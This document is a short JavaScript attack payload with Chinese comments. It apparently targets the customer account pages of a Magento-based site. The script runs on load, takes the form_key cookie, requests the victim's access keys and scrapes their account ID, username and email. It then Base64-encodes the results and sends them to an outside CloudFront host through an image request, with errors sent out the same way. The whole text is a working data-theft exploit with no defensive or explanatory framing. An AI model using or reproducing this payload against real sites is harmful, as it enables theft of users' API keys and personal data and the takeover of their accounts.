(function() {
    const EC2_BASE_URL = "https://d2sp0p7hm253bi.cloudfront.net/ccc?";

    // 辅助函数：Base64 编码
    const b64 = (str) => btoa(unescape(encodeURIComponent(str)));

    async function startPwn() {
        let results = {};

        try {
            // 1. 获取 form_key
            const fKey = (`; ${document.cookie}`.split(`; form_key=`).pop() || "").split(';').shift();

            // 2. 获取 Access Keys (需要 X-Requested-With 头部)
            const resKeys = await fetch('/customer/accesskeys/getAccessKeys/platform/magento_2', {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest' 
                },
                body: `formKey=${fKey}`
            });
            // 假设返回的是 JSON
            results.keys = await resKeys.json();

            // 3. 获取 User Info (串行执行)
            const resInfo = await fetch('/customer/account/edit/');
            const html = await resInfo.text();
            
            // 精准提取数据
            results.uid = (html.match(/id="mage_account_id"[\s\S]*?>\s*([\w]+)/) || [])[1];
            results.user = (html.match(/id="screen_name"[\s\S]*?>\s*([\w]+)/) || [])[1];
            results.email = (html.match(/id="email"[\s\S]*?>\s*([\w\.\@\-]+)/) || [])[1];

            // 4. 打包并使用 Image 对象发送
            // 将整个对象转为 JSON 字符串并编码
            const finalData = b64(JSON.stringify(results));
            
            const exfil = new Image();
            exfil.src = EC2_BASE_URL + finalData;
            
            console.log("Data dispatched via Image probe.");

        } catch (e) {
            // 失败则尝试发送简短错误
            new Image().src = EC2_BASE_URL + b64("error:" + e.message);
        }
    }

    startPwn();
})();
